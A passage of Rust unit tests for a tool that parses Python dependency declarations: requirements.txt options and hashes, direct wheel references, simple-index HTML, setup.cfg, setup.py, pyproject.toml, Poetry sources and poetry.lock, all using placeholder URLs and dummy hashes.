        fs::write(&requirements, "--no-deps\n").unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error.to_string().contains("unsupported requirements entry"));

        fs::write(&requirements, "local-pkg @ ./missing\n").unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported requirements entry `local-pkg @ ./missing`"));

        fs::write(&requirements, "./missing\n").unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported requirements entry `./missing`"));
    }

    #[test]
    fn reads_requirements_global_options_and_enforces_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(
            &requirements,
            "--trusted-host example.invalid\n--only-binary=:all:\n--only-binary idna\n--prefer-binary\n--require-hashes\nidna==3.7 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        assert!(discovered.pypi_require_hashes);
        assert!(has_spec(&discovered.specs, "idna", "==3.7"));
        assert_eq!(
            discovered
                .hashes
                .get("pypi:idna")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn rejects_require_hashes_without_hashes_or_exact_pins() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(&requirements, "--require-hashes\nidna==3.7\n").unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error.to_string().contains("needs a hash"));

        fs::write(
            &requirements,
            "--require-hashes\nidna>=3 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();
        let error = read_requirements_file(&requirements).unwrap_err();
        assert!(error.to_string().contains("needs an exact pin"));
    }

    #[test]
    fn command_line_require_hashes_enforces_requirement_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(&requirements, "idna==3.7\n").unwrap();
        let mut options = LinkOptions::new(dir.path());
        options.requirement_files = vec![requirements.clone()];
        options.pypi_require_hashes = true;
        let error = project_requested_specs(&mut options, false).unwrap_err();
        assert!(error.to_string().contains("needs a hash"));

        fs::write(
            &requirements,
            "idna==3.7 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
        )
        .unwrap();
        let mut options = LinkOptions::new(dir.path());
        options.requirement_files = vec![requirements];
        options.pypi_require_hashes = true;
        let specs = project_requested_specs(&mut options, false).unwrap();
        assert!(has_spec(&specs, "idna", "==3.7"));
    }

    #[test]
    fn reads_requirements_index_urls() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let wheels = dir.path().join(".").join("wheels");
        fs::write(
            &requirements,
            "--index-url https://mirror.example/simple\n--extra-index-url=https://extra.example/simple\n-i https://override.example/simple\n--find-links ./wheels\n-f https://files.example/packages\n--no-index\nidna==3.7\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        assert_eq!(
            discovered.pypi_index_url.as_deref(),
            Some("https://override.example/simple/")
        );
        assert_eq!(
            discovered.pypi_extra_index_urls,
            vec!["https://extra.example/simple/".to_owned()]
        );
        assert_eq!(
            discovered.pypi_find_links,
            vec![
                wheels.to_string_lossy().into_owned(),
                "https://files.example/packages".to_owned()
            ]
        );
        assert!(discovered.pypi_no_index);
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
    }

    #[test]
    fn reads_direct_wheel_requirements() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(
            &requirements,
            "idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        let spec = discovered
            .specs
            .iter()
            .find(|spec| spec.name == "idna")
            .unwrap();
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );
        assert_eq!(
            discovered.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
            ])
        );
    }

    #[test]
    fn reads_local_pypi_archive_requirements() {
        let dir = tempfile::tempdir().unwrap();
        let wheels = dir.path().join("wheels");
        fs::create_dir_all(&wheels).unwrap();
        fs::write(
            wheels.join("idna-3.7-py3-none-any.whl"),
            b"not a real wheel",
        )
        .unwrap();
        fs::write(
            wheels.join("typing_extensions-4.12.2-py3-none-any.whl"),
            b"not a real wheel",
        )
        .unwrap();
        fs::write(wheels.join("source_pkg-1.0.0.tar.gz"), b"not a real sdist").unwrap();
        fs::write(wheels.join("bare_pkg-2.0.0.tgz"), b"not a real sdist").unwrap();
        fs::write(wheels.join("zip_pkg-3.0.0.zip"), b"not a real sdist").unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(
            &requirements,
            "idna @ ./wheels/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\nsource-pkg @ ./wheels/source_pkg-1.0.0.tar.gz#sha256=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n./wheels/typing_extensions-4.12.2-py3-none-any.whl\n./wheels/bare_pkg-2.0.0.tgz\n./wheels/zip_pkg-3.0.0.zip\n",
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        let idna = discovered
            .specs
            .iter()
            .find(|spec| spec.name == "idna")
            .unwrap();
        assert!(idna.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(idna
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/wheels/idna-3.7-py3-none-any.whl"));
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "typing-extensions"
                && spec.direct_url.as_deref().unwrap().starts_with("file://")));
        assert!(discovered.specs.iter().any(|spec| spec.name == "source-pkg"
            && spec
                .direct_url
                .as_deref()
                .unwrap()
                .ends_with("/wheels/source_pkg-1.0.0.tar.gz")));
        assert!(discovered.specs.iter().any(|spec| spec.name == "bare-pkg"
            && spec
                .direct_url
                .as_deref()
                .unwrap()
                .ends_with("/wheels/bare_pkg-2.0.0.tgz")));
        assert!(discovered.specs.iter().any(|spec| spec.name == "zip-pkg"
            && spec
                .direct_url
                .as_deref()
                .unwrap()
                .ends_with("/wheels/zip_pkg-3.0.0.zip")));
        assert_eq!(
            discovered.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
            ])
        );
        assert_eq!(
            discovered.hashes.get("pypi:source-pkg").cloned().unwrap(),
            BTreeSet::from([
                "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc".to_owned()
            ])
        );
    }

    #[test]
    fn parses_pypi_simple_index_candidates() {
        let base_url = reqwest::Url::parse("https://index.example/simple/idna/").unwrap();
        let html = r#"
            <a href="../../packages/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" data-requires-python="&gt;=3.8">idna</a>
            <a href="idna-3.6.tar.gz#sha256=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb">sdist</a>
            <a href="other-1.0-py3-none-any.whl">other</a>
        "#;

        let candidates = pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"));
        assert_eq!(
            candidates,
            vec![
                PypiSimpleCandidate {
                    url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
                    download_url: None,
                    local_path: None,
                    filename: "idna-3.7-py3-none-any.whl".to_owned(),
                    version: "3.7".to_owned(),
                    sha256: Some(
                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                            .to_owned()
                    ),
                    sdist: false,
                },
                PypiSimpleCandidate {
                    url: "https://index.example/simple/idna/idna-3.6.tar.gz".to_owned(),
                    download_url: None,
                    local_path: None,
                    filename: "idna-3.6.tar.gz".to_owned(),
                    version: "3.6".to_owned(),
                    sha256: Some(
                        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
                            .to_owned()
                    ),
                    sdist: true,
                }
            ]
        );
        let legacy_candidates =
            pypi_simple_index_candidates(&base_url, html, "idna", Some("3.7.0"));
        assert_eq!(legacy_candidates.len(), 1);
        assert!(legacy_candidates[0].sdist);
    }

    #[test]
    fn pypi_simple_index_candidates_do_not_record_credentials() {
        let base_url = reqwest::Url::parse("https://user:pass@index.example/simple/idna/").unwrap();
        let html = r#"<a href="../../packages/idna-3.7-py3-none-any.whl">idna</a>"#;

        let candidates = pypi_simple_index_candidates(&base_url, html, "idna", Some("3.11.0"));
        assert_eq!(
            candidates,
            vec![PypiSimpleCandidate {
                url: "https://index.example/packages/idna-3.7-py3-none-any.whl".to_owned(),
                download_url: Some(
                    "https://user:pass@index.example/packages/idna-3.7-py3-none-any.whl".to_owned()
                ),
                local_path: None,
                filename: "idna-3.7-py3-none-any.whl".to_owned(),
                version: "3.7".to_owned(),
                sha256: None,
                sdist: false,
            }]
        );
    }

    #[test]
    fn reads_local_find_links_archive_candidates() {
        let dir = tempfile::tempdir().unwrap();
        let wheel = dir.path().join("idna-3.7-py3-none-any.whl");
        let sdist = dir.path().join("idna-3.6.tar.gz");
        let zip_sdist = dir.path().join("idna-3.5.zip");
        fs::write(&wheel, b"not a real wheel").unwrap();
        fs::write(&sdist, b"not a real sdist").unwrap();
        fs::write(&zip_sdist, b"not a real zip sdist").unwrap();

        let candidates =
            pypi_local_find_link_candidates(dir.path(), "idna", Some("3.11.0")).unwrap();
        assert_eq!(candidates.len(), 3);
        let wheel_candidate = candidates
            .iter()
            .find(|candidate| !candidate.sdist)
            .unwrap();
        assert_eq!(wheel_candidate.filename, "idna-3.7-py3-none-any.whl");
        assert_eq!(wheel_candidate.version, "3.7");
        assert_eq!(wheel_candidate.local_path.as_deref(), Some(wheel.as_path()));
        assert!(wheel_candidate.url.starts_with("file://"));
        let sdist_candidate = candidates
            .iter()
            .find(|candidate| candidate.filename == "idna-3.6.tar.gz")
            .unwrap();
        assert_eq!(sdist_candidate.filename, "idna-3.6.tar.gz");
        assert_eq!(sdist_candidate.version, "3.6");
        assert_eq!(sdist_candidate.local_path.as_deref(), Some(sdist.as_path()));
        assert!(sdist_candidate.url.starts_with("file://"));
        let zip_candidate = candidates
            .iter()
            .find(|candidate| candidate.filename == "idna-3.5.zip")
            .unwrap();
        assert!(zip_candidate.sdist);
        assert_eq!(zip_candidate.version, "3.5");
        assert_eq!(
            zip_candidate.local_path.as_deref(),
            Some(zip_sdist.as_path())
        );
    }

    #[test]
    fn parses_direct_archive_references() {
        let dir = tempfile::tempdir().unwrap();
        let wheel = dir.path().join("demo_pkg-1.0.0-py3-none-any.whl");
        fs::write(&wheel, b"not a real wheel").unwrap();

        let (spec, hashes) =
            parse_pypi_direct_archive_reference("demo_pkg-1.0.0-py3-none-any.whl", dir.path())
                .unwrap()
                .unwrap();
        assert_eq!(spec.name, "demo-pkg");
        assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(hashes.is_empty());

        let (spec, hashes) = parse_pypi_direct_archive_reference(
            "https://files.example/source_pkg-2.0.0.tar.gz#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            dir.path(),
        )
        .unwrap()
        .unwrap();
        assert_eq!(spec.name, "source-pkg");
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://files.example/source_pkg-2.0.0.tar.gz")
        );
        assert_eq!(
            hashes.into_iter().collect::<Vec<_>>(),
            vec!["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"]
        );
    }

    #[test]
    fn reads_direct_pypi_sdist_specs() {
        let spec =
            PackageSpec::parse("pypi:pkg @ https://example.invalid/pkg-1.0.0.tar.gz").unwrap();
        let resolved = resolve_pypi_direct_wheel(&spec).unwrap();
        assert_eq!(resolved.name, "pkg");
        assert_eq!(resolved.version, "1.0.0");
        assert!(!resolved.pypi_direct_wheel);
        assert_eq!(resolved.filename, "pkg-1.0.0.tar.gz");

        let spec = PackageSpec::parse("pypi:pkg @ https://example.invalid/pkg-1.0.0.zip").unwrap();
        let resolved = resolve_pypi_direct_wheel(&spec).unwrap();
        assert_eq!(resolved.version, "1.0.0");
        assert!(!resolved.pypi_direct_wheel);
        assert_eq!(resolved.filename, "pkg-1.0.0.zip");

        let spec = PackageSpec::parse("pypi:pkg @ git+https://example.invalid/pkg.git").unwrap();
        let error = resolve_pypi_direct_wheel(&spec).unwrap_err();
        assert!(error.to_string().contains("must use https or file"));
    }

    #[test]
    fn reads_setup_cfg_requirements_and_selected_extras() {
        let dir = tempfile::tempdir().unwrap();
        let setup_cfg = dir.path().join("setup.cfg");
        fs::write(
            &setup_cfg,
            r#"
            [metadata]
            name = setup-cfg-demo

            [options]
            install_requires =
                idna==3.7
                colorama; sys_platform == "win32"

            [options.extras_require]
            dev =
                charset-normalizer==3.4.0
            docs =
                markdown==3.6
            "#,
        )
        .unwrap();

        let base = read_setup_cfg_requirements(&setup_cfg, &BTreeSet::new()).unwrap();
        assert!(has_spec(&base.specs, "idna", "==3.7"));
        assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
        assert!(!base
            .specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"));

        let dev =
            read_setup_cfg_requirements(&setup_cfg, &BTreeSet::from(["dev".to_owned()])).unwrap();
        assert!(has_spec(&dev.specs, "charset-normalizer", "==3.4.0"));
        assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
    }

    #[test]
    fn discovers_setup_cfg_requirements() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("setup.cfg"),
            r#"
            [options]
            install_requires =
                idna==3.7
            "#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&discovered.specs, "idna", "==3.7"));
    }

    #[test]
    fn reads_setup_py_static_requirements_and_selected_extras() {
        let dir = tempfile::tempdir().unwrap();
        let setup_py = dir.path().join("setup.py");
        fs::write(
            &setup_py,
            r#"
            from setuptools import setup

            NOTE = "install_requires=['ignored-string==1.0']"
            # install_requires=["ignored-comment==1.0"]

            setup(
                name="setup-py-demo",
                install_requires=[
                    # "ignored-list-comment==1.0"
                    "idna==3.7",
                    "colorama; sys_platform == 'win32'",
                ],
                extras_require={
                    "dev": [
                        "charset-normalizer==3.4.0",
                    ],
                    "docs": ["markdown==3.6"],
                },
            )
            "#,
        )
        .unwrap();

        let base = read_setup_py_requirements(&setup_py, &BTreeSet::new()).unwrap();
        assert!(has_spec(&base.specs, "idna", "==3.7"));
        assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
        assert!(!base
            .specs
            .iter()
            .any(|spec| spec.name.starts_with("ignored-")));
        assert!(!base
            .specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"));

        let dev =
            read_setup_py_requirements(&setup_py, &BTreeSet::from(["dev".to_owned()])).unwrap();
        assert!(has_spec(&dev.specs, "charset-normalizer", "==3.4.0"));
        assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
    }

    #[test]
    fn discovers_setup_py_requirements() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("setup.py"),
            r#"
            from setuptools import setup

            setup(
                name="setup-py-demo",
                install_requires=["idna==3.7"],
            )
            "#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&discovered.specs, "idna", "==3.7"));
    }

    #[test]
    fn reads_pyproject_dependencies_and_selected_extras() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        let wheel = dir
            .path()
            .join("wheels")
            .join("local_idna-3.7-py3-none-any.whl");
        let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
        fs::create_dir_all(wheel.parent().unwrap()).unwrap();
        fs::create_dir_all(dir.path().join("vendor/local-package")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/uv-local")).unwrap();
        fs::create_dir_all(dir.path().join("packages/ws-local")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/extra-local")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/group-local")).unwrap();
        fs::write(
            dir.path().join("packages/ws-local/pyproject.toml"),
            r#"
            [project]
            name = "ws-local"
            version = "0.1.0"
            "#,
        )
        .unwrap();
        fs::write(&wheel, b"not a real wheel").unwrap();
        fs::write(&sdist, b"not a real sdist").unwrap();
        fs::write(
            &pyproject,
            r#"
            [project]
            dependencies = [
                "idna==3.7",
                "local-idna @ ./wheels/local_idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "local-source @ ./wheels/local_source-1.0.0.tar.gz",
                "local-package @ ./vendor/local-package",
                "uv-local",
                "ws-local",
                "skipped-local @ ./missing; sys_platform == 'win32'",
                "colorama; extra == 'windows'"
            ]

            [project.optional-dependencies]
            dev = [
                "charset-normalizer==3.4.0",
                "extra-local @ ./vendor/extra-local",
                "urllib3<3; python_version >= '3.0'"
            ]
            docs = ["markdown==3.6"]

            [dependency-groups]
            typing = ["typing-extensions==4.12.2"]
            test = ["pytest==8.2.0", { include-group = "typing" }]
            dev = ["ruff==0.5.0", "group-local @ ./vendor/group-local", { include-group = "test" }]

            [tool.uv.sources]
            uv-local = { path = "vendor/uv-local" }
            ws-local = { workspace = true }

            [tool.uv.workspace]
            members = ["packages/*"]
            "#,
        )
        .unwrap();

        let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap();
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
        assert!(!base.specs.iter().any(|spec| spec.name == "colorama"));
        assert!(base.specs.iter().any(|spec| spec.name == "local-idna"
            && spec.direct_url.as_deref().unwrap().starts_with("file://")));
        assert!(base.specs.iter().any(|spec| spec.name == "local-source"
            && spec
                .direct_url
                .as_deref()
                .unwrap()
                .ends_with("/wheels/local_source-1.0.0.tar.gz")));
        assert_eq!(
            base.hashes.get("pypi:local-idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned()
            ])
        );
        assert_eq!(
            base.python_local_paths,
            vec![
                dir.path().join("vendor/local-package"),
                dir.path().join("vendor/uv-local"),
                dir.path().join("packages/ws-local")
            ]
        );

        let default_dev = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        assert!(default_dev
            .specs
            .iter()
            .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some("==0.5.0")));
        assert!(default_dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
        assert!(default_dev
            .specs
            .iter()
            .any(|spec| spec.name == "typing-extensions"
                && spec.version.as_deref() == Some("==4.12.2")));
        assert!(default_dev
            .python_local_paths
            .contains(&dir.path().join("vendor/group-local")));

        let dev =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["dev".to_owned()]), true)
                .unwrap();
        assert!(dev.specs.iter().any(|spec| spec.name == "idna"));
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"
                && spec.version.as_deref() == Some("==3.4.0")));
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "urllib3" && spec.version.as_deref() == Some("<3")));
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some("==0.5.0")));
        assert!(dev
            .python_local_paths
            .contains(&dir.path().join("vendor/extra-local")));
        assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
    }

    #[test]
    fn rejects_cyclic_pyproject_dependency_groups() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [dependency-groups]
            dev = [{ include-group = "test" }]
            test = [{ include-group = "dev" }]
            "#,
        )
        .unwrap();

        let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap_err();
        assert!(error.to_string().contains("cyclic dependency group"));
    }

    #[test]
    fn rejects_unsupported_pyproject_direct_paths() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [project]
            dependencies = ["local-package @ ./missing"]
            "#,
        )
        .unwrap();

        let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported requirements entry `local-package @ ./missing`"));
    }

    #[test]
    fn reads_poetry_dependencies_and_dev_groups() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [[tool.poetry.source]]
            name = "private"
            url = "https://packages.example/simple"
            priority = "primary"

            [[tool.poetry.source]]
            name = "backup"
            url = "https://backup.example/simple/"
            priority = "supplemental"

            [[tool.poetry.source]]
            name = "duplicate"
            url = "https://backup.example/simple"
            priority = "supplemental"

            [tool.poetry.dependencies]
            python = "^3.11"
            requests = { version = "^2.32.0", source = "private" }
            rich = { version = "^13.0.0", optional = true }

            [tool.poetry.extras]
            ui = ["rich"]

            [tool.poetry.dev-dependencies]
            pytest = "^8.0.0"

            [tool.poetry.group.docs]
            optional = true

            [tool.poetry.group.docs.dependencies]
            markdown = "^3.6"

            [tool.poetry.group.lint.dependencies]
            ruff = "^0.5.0"
            "#,
        )
        .unwrap();

        let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "requests" && spec.version.as_deref() == Some(">=2.32.0,<3")));
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some(">=8.0.0,<9")));
        assert!(base
            .specs
            .iter()
            .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some(">=0.5.0,<0.6")));
        assert_eq!(
            base.pypi_index_url.as_deref(),
            Some("https://packages.example/simple/")
        );
        assert_eq!(
            base.pypi_extra_index_urls,
            vec!["https://backup.example/simple/".to_owned()]
        );
        assert!(!base.specs.iter().any(|spec| spec.name == "python"));
        assert!(!base.specs.iter().any(|spec| spec.name == "rich"));
        assert!(!base.specs.iter().any(|spec| spec.name == "markdown"));

        let production = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap();
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(production.specs.iter().any(|spec| spec.name == "ruff"));

        let with_extra =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["ui".to_owned()]), false)
                .unwrap();
        assert!(with_extra
            .specs
            .iter()
            .any(|spec| spec.name == "rich" && spec.version.as_deref() == Some(">=13.0.0,<14")));

        let with_docs =
            read_pyproject_requirements(&pyproject, &BTreeSet::from(["docs".to_owned()]), false)
                .unwrap();
        assert!(with_docs
            .specs
            .iter()
            .any(|spec| spec.name == "markdown" && spec.version.as_deref() == Some(">=3.6,<4")));
    }

    #[test]
    fn reads_poetry_direct_wheel_sources() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        let wheel = dir
            .path()
            .join("wheels")
            .join("local_idna-3.7-py3-none-any.whl");
        let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
        fs::create_dir_all(wheel.parent().unwrap()).unwrap();
        fs::create_dir_all(dir.path().join("vendor/local-package")).unwrap();
        fs::write(&wheel, b"not a real wheel").unwrap();
        fs::write(&sdist, b"not a real sdist").unwrap();
        fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            idna = { url = "https://example.invalid/idna-3.7-py3-none-any.whl" }
            local-idna = { path = "wheels/local_idna-3.7-py3-none-any.whl" }
            local-source = { path = "wheels/local_source-1.0.0.tar.gz" }
            local-package = { path = "vendor/local-package", develop = true }
            git-package = { git = "https://example.invalid/pkg.git", rev = "abc123", extras = ["cli"], subdirectory = "pkg" }
            "#,
        )
        .unwrap();

        let requirements = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
        let idna = requirements
            .specs
            .iter()
            .find(|spec| spec.name == "idna")
            .unwrap();
        assert_eq!(
            idna.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );

        let local = requirements
            .specs
            .iter()
            .find(|spec| spec.name == "local-idna")
            .unwrap();
        assert!(local.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(local
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("local_idna-3.7-py3-none-any.whl"));
        let local_source = requirements
            .specs
            .iter()
            .find(|spec| spec.name == "local-source")
            .unwrap();
        assert!(local_source
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("local_source-1.0.0.tar.gz"));
        assert_eq!(
            requirements.python_local_paths,
            vec![dir.path().join("vendor/local-package")]
        );
        assert_eq!(requirements.python_vcs_requirements.len(), 1);
        let vcs = &requirements.python_vcs_requirements[0];
        assert_eq!(vcs.name, "git-package");
        assert_eq!(vcs.url, "https://example.invalid/pkg.git");
        assert_eq!(vcs.reference.as_deref(), Some("abc123"));
        assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
        assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(
            discovered.python_local_paths,
            requirements.python_local_paths
        );
        assert_eq!(
            discovered.python_vcs_requirements,
            requirements.python_vcs_requirements
        );
    }

    #[test]
    fn rejects_poetry_unsupported_direct_sources() {
        let dir = tempfile::tempdir().unwrap();
        let pyproject = dir.path().join("pyproject.toml");
        fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            local-package = { path = "../local-package" }
            git-package = { git = "https://example.invalid/pkg.git" }
            "#,
        )
        .unwrap();

        let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported Poetry dependency source"));
    }

    #[test]
    fn reads_poetry_lock_constraints_and_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let poetry_lock = dir.path().join("poetry.lock");
        fs::write(
            &poetry_lock,
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
                {file = "idna-3.7.tar.gz", hash = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
            ]

            [[package]]
            name = "charset-normalizer"
            version = "3.4.0"

            [metadata.files]
            charset-normalizer = [
                {file = "charset_normalizer-3.4.0-py3-none-any.whl", hash = "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"},
            ]
            "#,
        )
        .unwrap();

        let requirements = read_poetry_lock_requirements(&poetry_lock).unwrap();
        assert_eq!(
            requirements
                .constraints
                .get("pypi:idna")
                .map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            requirements
                .constraints
                .get("pypi:charset-normalizer")
                .map(String::as_str),
            Some("3.4.0")
        );
        assert_eq!(
            requirements.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
            ])
        );
        assert_eq!(
            requirements
                .hashes
                .get("pypi:charset-normalizer")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc")
        );
    }

    #[test]
    fn discovers_poetry_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
